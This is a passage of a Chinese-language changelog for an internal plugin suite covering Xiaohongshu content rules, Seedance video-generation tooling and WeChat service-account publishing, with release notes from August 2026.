  他们改成价格文案从价格表动态生成 + 测试锁——契约漂移的正解是让文案没法漂。

---

## [1.66.0] — 2026-08-06

### 中文本土化表达沉淀为语言层硬规则（xiaohongshu-creator + content-reviewer 两端同源）

事故驱动：已发布笔记《强烈9分，安全4分，这两个数差得远吗》被运营整篇否决（「什么叫亲密关系的强烈？？？这完全不符合中文的表达习惯」），同款「形容词名词化」表述扩散 7 篇、2 篇已发布只能在线换图返工。根因是从长文术语向标题/图内压缩时丢了着落点（「强烈度刻度」→「强烈」）。

- **新增**（创作端）`xiaohongshu-creator/references/xiaohongshu-spec.md` §1「中文本土化表达」节：①概念名/刻度名/分组名/标签名必须是名词短语，光杆形容词禁做概念名（大众口语已名词化的词除外）；②压缩自检——「这个词的主语/宾语还在吗」+ 三句代入判定式（「X 打 9 分」等）；③朗读测试，翻译腔/论文腔返工；附五组实际返工正反例；替词优先大众口语名词、同篇刻度名恒定。
- **新增**（审查端）`content-reviewer/references/checklist-note.md` 判据 10：扫标题+图内+正文的概念命名位，光杆形容词做概念名 = FAIL；同篇刻度名不恒定 = FAIL；**不可被样本卡 ⑤ 段覆盖**（管的是语法与口语习惯，非风格偏好）。
- **修改** `xiaohongshu-creator/SKILL.md` 第 2/3 步验证清单挂钩本土化自检；`illustration-spec.md` 图内文字要求区补引用（图内空间挤、压缩时最先丢着落点，是重灾区）。

## [1.66.0] — 2026-08-06

### 转场实测入库 + frames2video / multiframe2video 接线

server 花 520 积分做了转场对照实验（逐帧亮度量化）——本产线迄今质量最高的证据：

- **不写转场=硬切；写了就按写的执行**，单条内可混用多种转场（溶解与黑场亮度曲线
  形态完全不同）；
- **有效写法三要素**：转场单独成段 + 写清过程（谁淡出谁浮现）+ 写清否定项——比官方
  「转场咒语」更进一步：把转场当成一个有过程的镜头来描述，不是贴标签；
- **类型可控、精确时长不可控**（要求 0.3s 实际 0.8s）：卡鼓点靠后期剪；
- **跨段人物漂移实锤**（文字锁不住，段内好跨段漂）——与角色卡结论互证；
- 边界照记：结论仅适用 multimodal2video 的 prompt 控制，multiframe2video 未测。

**接线两个新 operation**（server 昨晚上线，manifest 已核）：`frames2video`
（first/last 成对，本地校验恰 2 张）与 `multiframe2video`（2–20 故事帧 + N-1 段
transition_prompts/durations，段数不符本地拦；model/prompt 长式不下发）。
本机 CLI 封装未实现的 operation 在 local 后端明确报错，绝不静默走错命令。

回执 server：五条结论入库位置、角色卡对照实验设计（A 多图单视图/B 单图三视图/
C 纯文字，780 积分我们认，素材我们出）、催 2.5 单价入估算（数据障碍已不存在）。

测试 1071 → 1074。

---

## [1.65.0] — 2026-08-06

### 导演级重审：三个实瑕疵修复 + 方法论补五块 + 制片级需求

老板要求按大师导演/制片人的标准把产线再过一遍。找到并处理三类问题：

**skill 三个实瑕疵（都验证过，不是理论）**：

- **v3 格式跑 sync_durations 会报 missing cuts[]——真 bug**。v3 的职责重定义为
  **提交前的钱坑校验**：每段 gen 必须 ≥ 该段旁白总长+0.3s/beat（gen 不够意味着生成出来
  不够切，cut_assemble 只能事后告警，那时钱已花）。新增 run_segments 分支，超模型上限
  报 overflow 绝不静默截短；
- **字幕正落在平台遮挡区**：margin_v 原为高度 8%，竖屏 9:16 下小红书/抖音底部 ~18%
  是标题文案区。竖屏抬到 20%（横屏维持 8%）；
- **SKILL.md 十步流程还是 v1 写法**：第 5/6 步补电影化路线真实命令（segments 提交、
  segment-NN 改名、cut_assemble 切段、关键段多条选优），旧命令降为快版。

**新增第 4.5 步 · 动态分镜 animatic**——真实片场的 previz：花任何积分之前，用分镜图+
旁白拼一条零成本"静态动画版"验证节奏。**改分镜在 animatic 上改是免费的，生成后改是烧钱的。**

**方法论补五块（637 行）**：

- **全片视觉设计**（导演阐述层）：色彩弧线（冷包围暖→暖包围冷）、光线弧线（光的角度
  与色温单独排线）、视觉母题（热茶三现：捧着→凉了→重新冒热气）；
- **关键镜多条选优（coverage）**：钩子段 3 条、收尾段 2 条、中段 1 条——是变体不是重试，
  预算按基础×1.5 打，比均匀抽卡便宜且效果好；
- **前 3 秒军规**：第 1 秒必须有已发生的动作或反差；开场禁用淡入/空镜起手/铺垫——
  竖屏的"慢"只能放中后段；
- **声音叙事三招**：静默是最贵的音效（金句前收掉所有声音 0.5–1s）、BGM 弧线、J-cut
  声音先入；
- **产线待办表**：静默 beat / BGM 分段自动化 / J-cut / 段尾帧提取——方法论已定义、
  代码未支持的能力，动手前对照防重复发明。

**server 需求新开一份**《制片级四缺口》：2.5 单价入估算表（默认档竟无预算预警，
数据他们已实测只差入表）+ batch `max_credits` 预算护栏（"花钱的决定必须显式"）+
视频资产库（好镜头是跨片资产，等 video[] 开放后就是最好的运镜参考）+ 段尾帧提取；
并催 session 语义与超长视频 CLI 入口两笔旧账。

---

## [1.64.3] — 2026-08-06

### 沉淀收尾：SKILL.md 旧 prompt 公式废弃，全面指向方法论

老板问「方法论沉淀到 skill 了吗」——核出新旧两套并存：SKILL.md 的「Seedance 中文
prompt 写作要点」还在教一句话混写公式（主体+动作+镜头+光线+氛围），agent 走十步流程
会先撞到旧节、和方法论的四件套打架。

改法：旧公式标记**已废弃**并指向 `references/cinematic-direction.md` 为唯一真源；
保留四条本 skill 特有铁律（图内无文字/东亚面孔/品牌美学/多图单视图锁人物——最后一条
按官方裁决更新）；分镜骨架改两档形态（电影化默认 / 快版 6–12 镜），口径与方法论对齐。

---

## [1.64.2] — 2026-08-06

### 手册通读完毕：镜头密度放宽 + 转场补全 + 《奶奶的菜谱》四启示

v1.64.1 只细读了手册前半，被老板一句「方法论没有需要更新的吗」问住——补读后半
（超长视频写法/延长写法/白模/亮点案例），又改了五处：

- **镜头密度放宽**：server 早前建议「一条 2–3 段」偏保守。官方 30s 案例全是 **4–5 镜**，
  网页端超长模式一条 prompt 装 **9–10 段**（75s 案例 10 段）。按官方案例密度执行；
- **转场表补两种最常用的**：「自然镜头切换」（软性硬切，强调呼吸感与切换时间，
  绝大多数常规叙事的默认选择）与「淡入淡出」；另收官方推荐的「让模型自选转场」写法；
- **2.5 能生成完整对白**（官方案例台词全是模型直出）——我们禁对白是选择不是限制，
  已标注：哪天做「人物开口」的片子这条路是通的，但与克隆音色旁白须整片二选一；
- **「分段式导演控制」**：延长功能的官方打法是"走一步看一步"（12s→+5s→+13s 三步接力），
  每步都是确认点，不用一次赌 30 秒；
- **《奶奶的菜谱》四启示**（官方唯一温情治愈案例，离我们调性最近）：全局约束置顶、
  **叠化回忆闪回**（"此刻连着过去"的第二语法，比瞳孔套娃温和）、音效可点位到帧、
  **片尾金句字幕可由模型直出**（台词能控制到「仅发声，无字幕」）。

至此 1143 段全部读完（前半细读、后半细读关键节+案例粗扫）。原件 338MB 上传完成，
CRC 全过，重提取与半程版逐段一致——此前的修正无需返工。docx 内另有 180 张官方
案例截图，按需再挖。

---

## [1.64.1] — 2026-08-06

### 官方 2.5 手册到手：修正两处版本性错误 + 裁决一个悬案 + 九种转场入库

老板拿到官方《Seedance 2.5 使用手册》（115MB docx，飞书导出、zip 目录未写完，
按 local file header 手工扫描提取出 1142 段全文，存
`NBDpsy/文档/2026-08-06-即梦Seedance2.5官方手册-提取文本.txt`）。
对照方法论逐条查漏补缺：

**两处修正（都是把 2.0 时代经验当成了通则）**：

- **时间戳精度**：v1.64.0 按 server 回执写了「秒数写成节奏引导，别写死」——那是 2.0 经验。
  **2.5 的时间戳控制是官方头牌新功能**（"精确到具体秒数下达指令，实现剧本级的精准还原"），
  官方案例全用 `[00:00-00:07]` 格式。已按版本分开标注：2.5 放心按秒写，2.0 才写节奏引导；
- **负向提示词**：v1.64.0 写了「否定会召唤，别写否定式」——2.0 社区经验。**2.5 官方公式
  自带「禁止项」模块且明确推荐**（禁止字幕/强制静音去 BGM 是官方案例标配），2.5 发布亮点
  之一就是优化负向响应。规矩改为：禁止项集中写【全局补充】、写具体行为不写抽象品质。

**一个悬案裁决**：人物一致性「三方打架」（三视图角色卡/单张标准像/不垫图）——官方手册
直接给了答案：**多图多视图 > 单图多视图**，「如需多视角，拆分为多张不同视图输入，而非
一张包含多视角的图」。定案：角色出 2–3 张独立单视图分别传，⛔ 不做单图三视图拼版。

**新增「官方 2.5 公式与新武器」一节**：完整公式（多了【全局补充】收尾段）、30s+ 三模块
变体、**「潜台词」**（官方案例每镜必写，向 AI 解释物理指令的深层表达——并入分镜四件套后
每镜五行）、人物八维公式（[眼神/灵魂] 单独一维）、**九种转场词表 + 固定咒语**（相似物转场
与瞳孔套娃是心理科普的天然语法：「此刻的反应连着过去的经历」）、官方抽卡数值（参考图
1–5 张是甜区，30 张上限别当目标）、素材硬规格、网页版专属能力清单（超长视频 30–180s
直出/视频延长/智能编辑）。

server 需求文档同步追记：请核对 CLI 有无超长视频/延长/编辑入口；videos[]/audios[] 校验
按 2.5 规格（单个 2–30s 总 30s，别沿用 2.0 的 15s）；图片规格建议物化时提前 422。

---

## [1.64.0] — 2026-08-06

### 电影化产线：方法论 + 多图参考 + 分段拼装

老板定方向——视频要做成「像电影一样，几秒一个分镜」，1–3 分钟。这版把框架搭起来。

**新增 `references/cinematic-direction.md`（396 行方法论）**，把「电影感」拆成可执行的判断：

- **第一条铁律：「电影感」这个词本身不能写进提示词**。公开指南把 `电影感/cinematic/氛围感`
  单列为一类失败源（feel-suffix slop）——抽象评价词让模型不知道该强调哪个元素。要写造成它的
  物理原因：景别 + 运镜 + 光源方向 + 色调。附替换表与另外两类要避开的写法（否定式会召唤、
  标签堆砌要改成拍摄通告）。
- **分镜四件套**（来自《丧尸清道夫》作者 Mx-Shell 的开源方法论 `jnMetaCode/ai-shortfilm-prompts`）：
  **景别 / 构图 / 运镜手法 / 画面内容**，每行只回答一个问题。我们原来一句话混着写，模型要
  自己拆解哪部分是构图哪部分是内容；拆成四行遵循度明显更高——这是他 200+ 镜头实战的结论。
- **导演读解六必填**：这一段挣到什么、转折点、视角、她在躲什么、**一个可见的抑制动作**、
  拒绝哪个套路。第 5、6 条是把片子从「科普配图」抬到「作品」的分界线。
- **人物一致性三方打架，如实并列不强行调和**：角色卡流 / 单张标准像 / Mx-Shell 的「干脆不垫图」
  （理由：垫图会复现参考图的**画风**而非它的**设计**）。我们的处境与三方都不同，标记为
  **未定待实测**，给了临时做法。
- 另收：瑕疵即真实（我们的插画风版本：袖口起球、杯子有旧茶渍）、抽卡是常态（影响预算规划）、
  摄影机锚点迁移到插画语汇、「呼吸感」防 PPT 静帧、1–3 分钟的分段骨架、对抗审查四类清单。

**接上 server 已开放的多图参考**：`multimodal2video` 从单张 `image` 改为 `images[]`
（2.5 ≤30、2.0 家族 ≤9，本地按档拦截）。核心是**顺序即语义**——数组第 N 张就是 `@图片N`，
所以脚本**绝不去重、绝不重排**，本机图逐张换直链时位次原样保持，任一张上传失败整镜回落
（半数换直链的混合态会让编号错位，比回落更糟）。新增 4 条测试钉死这个语义，注释写明
**编号错位不报错、只默默出错图**。

**新增 `cut_assemble.py`（分段拼装层）**：一段 = 一次生成（≤30s，模型在段内自己切镜），
本脚本按旁白边界把长片段切成 `shot-NN.mp4`。切完 `build_manifest`/`compose_video` 一行不用改。
`sync_durations` 加 v2/v3 分支，`use`（成片用几秒）与 `gen`（提交生成几秒，≥4 是平台硬约束）
严格分开。

**按 server 回执改的两处**：生图轮询窗口 360→600 秒（重试把单页最坏耗时拉长，360s 会误判成
卡死而服务端其实还在重试）；分镜秒数改成整数段的节奏引导，不再写 0.1 秒精度（模型对硬切分
支持不稳）。

测试 1067 → 1071。

---

## [1.63.0] — 2026-08-05

### text-to-video：image2video 本机图自动传图床（运营零本机依赖闭环）+ 登录脚本 Device Flow 重写 + 版本守卫测试

- **本机参考图不再整镜回落本机 CLI**：server 路径上新增 `_prepare_server_shot()`——本机图先
  `POST /api/uploads/images`（multipart）换直链再提交 server；上传免费无副作用故网络异常直接
  重试 1 次（区别于提交类 POST 的复用 ref 幂等重发），仍失败才回落本机 CLI。多图/带
  video·audio 的镜维持原回落。**至此十步产线的第 5-6 步对运营完全零本机依赖**（免装 CLI、
  免登录、免图床手工操作）。
- **`dreamina_login.py` 重写为 OAuth Device Flow**（CLI a857341 起旧回调流失效）：起
  `dreamina login` 抓 `verification_uri` → 尽力弹浏览器 + stderr 打完整网址（**任何设备**可
  授权，码约 10 分钟过期）→ 等 CLI 退出后以 `user_credit` 复核为准。旧「日志抓 port + 拼
  callback 网址」整体删除并有测试守卫防复活。
- **新增 tests/test_version_consistency.py**：plugin.json/marketplace.json 三处版本必须一致
  且等于 CHANGELOG 全部版本节的最大号——把本文件顶部那两条铁律变成机器门禁（本次发版顺带
  第四次纠正版本文件倒退：1.59.3 → 1.63.0）。
- 交接文档《交接-2026-08-05-即梦视频生成服务化.md》待开发清单第 1、2 条标记完成。

## [1.62.1] — 2026-08-05

### seedance2.5 换代的文案收尾 + 版本号第三次倒退纠正

**四处换代残留**（v1.62.0 切了默认模型与 Device Flow，但这几处文案还停在旧世界）：

- `check_env.py` 的 server 未登录 fix 文案还在教人「跑 dreamina_login.py 扫码、迁 `~/.dreamina_cli/`」
  ——**那是旧回调流，对新 CLI（a857341+）完全无效**，照做等于白忙一场。改为 Device Flow 指引
  （server 上跑 `dreamina login`，verification_uri 任何设备可开，凭据落 `~/.local/share/dreamina/`）；
- SKILL.md frontmatter description 与标题还写「Seedance 2.0」且只提本机 CLI——改为 Seedance 系列
  （默认 seedance2.5）+ 主路 server REST、回落本机 CLI 的真实架构；
- 凭据撤销指引里的旧路径 `~/.dreamina_cli/` 补上新路径。

**版本号纠正**：`c5ba7ba`（strategy-report v1.59.2）把 plugin.json / marketplace.json 从 1.62.0
写回 1.59.2——**第三次版本倒退**（前两次：1.61.5、1.59.1）。根因是各线按"自己上一个号 +1"发版。
本版恢复单调递增，并把两条发版铁律写进本文件顶部说明：**新号 = 顶部第一节的号 +1**；
新节必须插最顶。

---

## [1.62.0] — 2026-08-05

### text-to-video：默认模型切 seedance2.5 + 新版 CLI 适配 + 服务化交接文档

- **默认模型 seedance2.5**（CLI a857341 起可用）：130 积分/5s（生产实测对账精确）、**秒级出片
  无排队**、时长 4–30s、VIP-only。模型集合扩到六档（另新增 seedance2.0mini）；时长校验按模型
  分档（仅 2.5 到 30s，其余 15s，超档当场拦不白跑提交）。`--video_resolution` 统一 720p
  （全家族唯一通吃档）。server 侧同步上线（nbdpsy-server `0e1c334`），**必须先于本版部署**。
- **新版 CLI 登录换 OAuth Device Flow**：凭据迁 `~/.local/share/dreamina/`，授权链接任何设备
  可开（不再受 127.0.0.1 回调限制）；SKILL.md 登录指引已重写，旧 `dreamina_login.py` 对新 CLI
  失效待重写。⚠️ 升级 CLI 会让旧登录态一次性失效，需重扫一次。
- 新增《交接-2026-08-05-即梦视频生成服务化.md》：server 端点速查、资金语义六条铁律、模型
  经济学（2.5=130 秒出 / fast_vip=55 ~3min / fast=25 可排 15h+）、待开发清单（image2video
  先传图床、登录脚本重写）。模块 docstring 的「批量不自动重发」陈旧表述同步修正（v1.61.3
  起已开重发）。

## [1.61.5] — 2026-08-05

### fuwuhao-operator：贴图文案 1000 字硬上限本地闸门

官方文档没写的硬限，实测二分得出：图片消息 content 1000 字过、1001 字起微信拒
（errcode 45166 invalid content）。`--draft-add-newspic` 超限本地拦（零调用、不白传图），
800 字起先警告；SKILL.md 同步。测试 +1 共 157 过。

## [1.61.4] — 2026-08-05

### fuwuhao-operator：第 5 步改为「先选路径」——文章进主页也走后台点发表

穷举官方文档确认无隐藏参数（freepublish/submit 仅收 media_id；draft/add 全字段无主页/通知开关；
「进主页」开关只做在公众平台后台）。第 5 步开头改为三路分流：进主页=后台点发表 /
推送粉丝=群发 / 只要链接=API 发表；补「定时发布到点发出的内容同样不进主页」警示。

## [1.61.3] — 2026-08-05

### text-to-video：批量 POST 恢复网络超时重发——server 侧逐镜幂等已验收

server 已上线即梦服务化并出回执（《2026-08-05-server回执-即梦视频生成服务化》）：批量端点按
`shots[].client_ref` 逐镜去重、去重先于登录/积分闸，活体验收「同 shots 同 refs 重放 → 原
clip_ids 零新增零扣分」。据此把 `_server_batch` 的 `retry_on_neterr` 从 False 恢复为默认
True——网络异常复用同一组 client_ref 重发一次是安全的。回归测试改为断言「恰好重发一次 +
两次 payload 的 ref 逐镜一致」。至此 server 模式全链贯通：探测自动切换已在生产实测
（`backend: "server"`，fast_vip 单镜 skill 客户端全链 ~2.5 分钟出片、直链下载、积分对账精确）。

另修版本文件回退：c723d37 误把 plugin.json / marketplace.json 写成 1.59.1（低于已发的
1.60.0/1.61.x，破坏更新器的单调判断），本版一并纠正到 1.61.3。

## [1.61.2] — 2026-08-05

### fuwuhao-operator：修正关键口径——API 发表（freepublish）的内容不进公众号主页

生产实证（台账 9 贴图渲染正常但主页历史不可见）+ 官方社区一致口径：API `freepublish/submit`
发表的内容属「未通知」，**不显示在公众号主页历史**（文章与贴图同理），产出只是永久链接
（挂菜单/合集/分享用）。要上主页只有两条路：后台手动「发表」或群发。

- 红线①补「API 发布不进主页」及 ⛔ 话术禁令；此前「发表后仅在公众号主页展示」的口径只对
  **后台手动发表**成立，对 API 不成立。
- 贴图标准流程改为「skill 建稿 + 运营后台点发表」；`--draft-add-newspic` 回执 hint 同步改写。
- 后台发表的内容台账不会自动记录——贴图线上有什么以后台「发表记录」为准（红线④的贴图例外）。

## [1.61.1] — 2026-08-05

### fuwuhao-operator：SKILL.md 触发描述补贴图关键词

1.61.0 加了贴图能力但 frontmatter description 没带触发词——用户说「发贴图 / 发小绿书 /
把小红书笔记发到服务号」时 skill 不会被唤起。description 补关键词，子场景五 → 六。

## [1.61.0] — 2026-08-05

### fuwuhao-operator：贴图（图片消息 newspic）——小红书笔记一条命令平移到服务号

「贴图」= 原「小绿书」2026 年升级版（图为主 + 纯文本短文案，对标小红书），微信给独立分发位
（公众号主页【贴图】栏、看一看、搜一搜「贴图号」分类）。生产实测全链路通过
（台账 9：8 图笔记平移 → published）。

- **`article_ops.py --draft-add-newspic`**：`--title` + `--text 文案.txt`（纯文本）+
  `--images 目录或逗号列表`（≤20 张，首图即封面），传永久素材 + 建 newspic 草稿一条龙；
  发布/台账/备注/删除与文章共用既有命令。
- **`wechat_api.upload_material_image()`**：永久图片素材上传公共层（jpg/png、10MB 本地闸门，
  幂等可重试）。
- **守卫**：`--draft-update` 遇贴图草稿直接拒（图文字段表整篇替换会抹掉全部图），指去重建；
  文案疑似 HTML/Markdown 产物时警告点破；>20 张本地拦。
- SKILL.md 新增「贴图（独立线）」一节；capabilities.md 八项 → 九项。
- 测试 +6（顺序对齐/目录排序/20 张闸门/HTML 文案警告/update 拒绝/格式闸门），156 全过。

## [1.60.0] — 2026-08-05

### text-to-video：jimeng_gen 双后端——即梦生成迁 nbdpsy-server（REST 优先、本机 CLI 兜底）

配合《2026-08-05-server需求-即梦视频生成服务化》：`jimeng_gen.py` 从纯本机 dreamina CLI 封装
改为**双后端薄客户端**。五个子命令（credits/gen/submit/fetch/batch）契约不变、旧输出键一个不少
（新增 `backend` 等附加键），server 未上线前**零行为变化**。

- **auto 探测**（默认）：本机有 `NBDPSY_XHS_API_KEY` 且 server `GET /api/dreamina-status` 回
  `logged_in=true` → 走 nbdpsy-server（运营免装 CLI、免扫码、排队不用挂会话）；探测不通自动回落
  本机 CLI。`--backend server|local|auto` / `NBDPSY_JIMENG_BACKEND` 可强制。
- **资金安全**（submit 即占队列、success 即扣积分的事故背书条款）：单镜 POST 带 `client_ref`
  幂等键，仅网络异常重发一次且复用同一 ref；HTTP 4xx/5xx 一律不重发；批量端点幂等未经服务端
  验收前**不自动重发**；任何路径不对卡 querying 的任务自动重提；超时/失败均保留 submit_id。
- **fetch auto 分派**：先免费问 server 认不认领该 id，再按 16 位 hex 形态兜底——防 server clip_id
  形态碰撞把任务派给本机 CLI 空转 30 分钟诱导重跑 gen 双倍扣分。
- **逐镜回落**：server 模式下参考图是本机路径 / 带 video·audio / 多图的镜整镜回落本机 CLI
  （server 单镜契约只收图床直链或 `/uploads` 路径），混合批两后端并存、一镜失败不连坐。
- **check_env**：server 模式下「dreamina CLI / 登录 & 积分」两查换成一条「即梦服务(server)」；
  强制 local 不再发网络探测，强制 server 探测失败报真因（不误报「未登录」）。
- 轮询健壮性：200+非 JSON 响应按瞬时失败计数（不再伪装「正常排队」空转）；下载 `.part` 原子落盘；
  clip_id 消毒后才拼文件名。新增 tests/test_jimeng_gen.py 全离线 64 用例。

## [1.59.0] — 2026-08-04

### 新增 nbdpsy-strategy-report：月度战略报告生产线（管理员专用）

7 月战略报告（后台 /strategy 的 `strategy-202607`）从零做到发布走了一整条线：六路并行采集生产库、
北极星 KPI 先回算 H1 基线逐格命中再出当月值、20 个头条数字独立对抗复核零误差、按老板拍板的
麦肯锡范式写正文（SCQA + 行动标题 + 图表 so-what + 行动清单四列表）、自包含 HTML 发布、底稿归档。
这条线沉淀成 skill，下月说一句「出 8 月战略报告」即可复跑。

四份 references 各管一段：`data-collection.md`（六路采集清单 + 口径手册——已发生会话含
pending_feedback、占位判据 is_placeholder、金额走 apt_no 关联等踩过的坑全部在册）、
`kpi-definitions.md`（五分层/北极星/留存/D3 判据出处 + 「先回算基线再产出」铁律 + 按咨询师转化
必须做时间定向的教训）、`mckinsey-style.md`（写作范式 + 「过程叙述不入文」禁令原文）、
`publish.md`（自包含 HTML 硬要求、铸 JWT 的 sub 必须 i64 数字、同 slug 覆盖保批注、双端目视清单）。

**刻意不进 nbdpsy-guide**：guide 是运营的第一站，本 skill 需要管理员主环境（NBDpsy 主仓库 +
SSH 直连生产库 + admin 发布权限），运营机器上前置检查即失败——写进向导只会制造「我怎么用不了」。
README 表格已加行并标注 ⚠️ 管理员专用。

### 上手向导补上服务号这轮的三块（又是那个公共汇合处）

v1.58.0 把配图生成、能力全景（`capabilities.md`）、触达通道都做进了 `nbdpsy-fuwuhao-operator`，
但 `nbdpsy-guide` 停在 8-02 写的那版——只列了五个子场景。向导是运营的第一站和客服台，
运营在这里问「服务号能干啥」「给公众号出个封面」，接住的是一份过时清单。

补三处：

- **第 2 步能力表**那行改成「一句话走完全程」的实际链路（写长文 → 改公众号版 → 出封面/插图 →
  排版编译 → 发布/定时发），触发语加「给公众号出封面」；
- **第 3.7 步**补两段：①能力问答一律读 `references/capabilities.md`（八项能力 + 「不能做什么」表），
  别现编也别硬凑；②服务号**还是一条触达通道**（五类即时回执），但「刚发生的事的回执」之外
  一律不行——预约前提醒/催付款/催填问卷是微信合规红线，直接说不行并给替代通道（短信、
  小程序订阅消息），别去试；
- **速查表**加三行：能力问答 / 出封面配图（**先确认封面再批量出插图**）/ 定时催达红线。

这是第二次在同一个位置漏：两条线各改各的 skill，公共汇合处（guide）谁都没动。

---

## [1.58.0] — 2026-08-04

### 公众号配图生成：照小红书那套锚点法复刻，只改横版与裁切

服务号 skill 此前只会排版发文，稿子没图就卡住，运营得自己去别处找图。现在补上生图这一环，
**复用小红书那条已验证的链路**——同一个出图后端（gpt-image-2 锚点法）、同一把凭据
（`NBDPSY_XHS_API_KEY`）、同一套运营风格档案，不新增任何凭据、不另建风格体系。

**新增 `nbdpsy-fuwuhao-operator/scripts/gen_gzh_images.py`**。与小红书 `gen_images.py` 的差异
只有三处，其余（轮询、`--job` 复查、pending 绝不重发、四态信封、台账 404=可安全重发）逐条照搬：

1. **恒传 `aspect_ratio: "16:9"`** 拿横版 1536×1024。公众号是横向阅读，竖图塞进正文撑爆版面。
2. **一篇 1 张封面 + 0~3 张插图**，不是 6–9 页轮播。CLI 用 `--cover-only` 与 `--pages`
   （`--pages` 选的是插图编号，**绝不把封面捎带出一遍**——那会白烧额度还覆盖掉已确认的封面）。
3. **封面居中裁 2.35:1**（微信封面官方比例）：下载的 16:9 原图存 `cover-raw.jpg` 便于重裁，
   裁好的 1536×654 存 `cover.jpg`。插图不裁。

落盘统一转 JPEG（质量阶梯 92→64）：gpt-image 原图是 PNG，1536×1024 常有 1.5~3MB，
而**微信正文图硬上限 1MB**，不转就会卡在 `md2wechat.py` 上传那一步。

提示词从稿子的 **「## 配图」区块**解析（`### 封面` / `### 插图N` 定位 + 区间内第一个 ``` 围栏，
判据与小红书 `### PN` 同源）。**没有该区块直接报错并指回规格文档，绝不现编提示词**——
提示词要按当前运营的风格档案写，编的没人兜底，出了也是废图。

**新增 `references/gzh-illustration-spec.md`**（面向公众号长文，不重复维护小红书那份的副本）：

- **封面视觉重心必须居中**——上下各 185px 会被裁掉，主体贴边就没了；
- **封面图内不放大段文字**（与小红书最大的一条差异）：信息流里封面缩得很小、字看不清，
  且**标题由微信自己渲染**，图里再写一遍就是两份标题打架；
- **不用刻板苦情图**（抱头痛哭/蜷缩墙角/黑白）：既是刻板印象，也与"这不是你的错"的基调相反；
- 风格档案**复用图文（carousel）那一套**，逐字段列明哪些照抄（`palette`/`text_color`/
  `character_card`/`texture`）、哪些不适用（`cover_layout` 是竖版排法、`density` 是小红书口径）。

**SKILL.md 加「第 2.5 步 · 出配图」**（稿子已有图就整步跳过），并点明**出配图那把 key 与发文
那把是两把独立的 key、走两个服务**——报 `MISSING:` 时先看它点的是哪一把。

### 两条实测坑写进规格

**① 提示词写"横版 16:9"、实际画布却是竖版时**，模型会照 16:9 构图、把画面画在竖画布正中，
上下留两条大片纯色空白——一张"信箱式"废图。**声明的画布必须与真实出图一致**；
拿到**竖**图时先查服务端有没有接住 `aspect_ratio`，**别去调提示词**，那是白调。

**② 裁剪一律按到手的图现算，绝不认死 1536×654**：服务端去水印工作流会做**非整数等比缩小**
（实测 ×0.855），真实到手是 **1313×876**、裁后 **1313×559**。`crop_box()` 用
`round(w / 2.35)` 现算——**比例恒定、绝对像素随实际宽度走**。验收看比例不看绝对值。
两条回归测试（三种宽度 + 缩过的 1313×876 端到端）把这条锁死。

真实出图已验证：`1313×876 → 1313×559`（比例 2.349），画面横贯无信箱空白。

## [1.57.0] — 2026-08-04

### 组件回读 + 引用收口：按运营侧变更需求逐条落地

运营 8 月有 360 篇批量计划，两条 P0 会直接决定脚本能不能用。

**P0-1 新增 `note_ops.py --read-components`**（配 `--account` 与 `--note-id`）：回读平台实况——
`quote_set` / `quote_text` / `collection_set` / `collection_label` / `collection_entry_present` /
`topics` / `image_count` / `permission` / `body_head`。只读且**幂等，失败可放心重试**。

**这是核对组件的唯一可信来源**。`published_notes` 表根本没有组件列，`--note` 读到的
`quoted_note_id` / `collection_id` **恒为 None**——拿它推断会得出「全都没挂上」的相反结论
（运营为此盲测了两天，最后手写脚本直调 API 才发现组件其实都在）。所以 `--note` 的输出里加了
`components_hint` 明确劝退，SKILL.md 也把这条写进「成功不等于生效」那一节紧挨着判据。
量大时**抽样核对 + 失败单必查**，别全量逐篇（每篇要开一次编辑页、串行拟人化）。

**P0-2 引用自动推导已收口**：`--set-components` 只传合集/活动/编辑项时，**不再顺带挂引用**。
批量作业里这是最容易静默漏挂的一处——什么都不给就是不挂，且**不会有任何报错**。现在脚本会在
提交前打一条 warning，SKILL.md 用一张表把两条路径分开写：**发新笔记的自动推导保持原样**
（推介笔记自动引接待员、科普笔记自动引本账号推介），**改已发布笔记必须显式给**
`--related-counselor` 或 `--quoted-note-id`。

**P1-1 `--collection-name`**：带 `--collection-id` 时顺带给合集名，服务端用它做「已选态」比对；
不给且页面解析不出会报 `collection_chosen_unverifiable`。另：合集挂载**已幂等**（已在目标合集
返回 `status: "skipped"` 也算成功），**批量挂载可安全重跑，调用方不用自己去重**——写进了 SKILL.md。
「合集零实战」那句同时删掉，运营已实测四篇全部真实生效。

**P1-2 `--job` 打印 `applied`**：v1.56.0 已做（`job_brief` 整体透传，含 `topics_applied` 与
`components.activity.status`），本次核对确认无需再改。

**P2 help 三处修正**，都补了本地预检而不只是改文案：

- `--add-image` **只收图床直链或 `/uploads` 路径**，传本地文件路径服务端 422——脚本提交前直接拦，
  并指向 `publish_note.py --upload-images`；
- `--expected-image-count` 是**编辑前的当前张数，不是目标张数**（删 1 张时传 6 不是 5）；
- 正文里话题标签**之间不能留空格**，须连写 `#A[话题]##B[话题]#`，否则回读校验必然
  `content_readback_mismatch`——`--set-content` 检出空格写法时给 warning。

**P3 实操经验进 SKILL.md**：出图后必须压缩（信息卡 PIL 量化 32 色 / **真人照片必须 JPEG q92**，
调色板量化会让面部出现色带；每篇 ≤2.5MB，否则发布 30 秒超时）；定时任务 pending **不要 cancel**
（运营曾误删 9 篇排好的定时稿，只看 `pending_overdue`）；同账号发布**共享一把锁严格串行**，
批量前先 `--list-jobs --status pending` 看队列；活动照带无害、探测看首篇回执的
`applied.components.activity.status`；临时脚本直调 API **必须用 `requests` 不要用 `urllib`**
（会被 Cloudflare 按指纹拦成 `error code: 1010`，所有端点一律 403，很容易误判成接口坏了）。

实测一篇跑通回读（`quote_set=false` / `topics` 6 个 / `image_count=3` / 公开可见）。测试 921 → 925。

---

## [1.56.0] — 2026-08-03

### 按 server「能力全景总纲」对齐：编辑已发布笔记 + 两条会误导人的语义

服务端把散落各回执的增量收成了单页地图（`文档/2026-08-03-server能力全景-skill对接总纲.md`），
逐块核了一遍，接了新能力、改了一条已经过时的说法。

**`--set-components` 从四个字段扩到九个**——同一个入口现在还能改**标题 / 正文 / 图片**：

- `--set-title`（空串=清空；显长 >20 服务端 422 不截断）；
- `--set-content` / `--set-content-file`（≤900 字）。⚠ **整体替换正文会丢掉既有话题实体**
  （含发布时精选的），平台行为不重建——丢了哪些在 `topics_dropped` 里，成功也会把这条 hint 打出来；
- `--add-image` / `--remove-image-index`（1-based），**必须配 `--expected-image-count`**：
  服务端的防呆闸，页面实数不符整单零点击拒绝。脚本在提交前先拦一道，别等 422 才发现缺什么。

**`applied` 改成逐项三态**（`true` 生效 / `false` 没生效 / **`null` 本次没请求**）。之前按
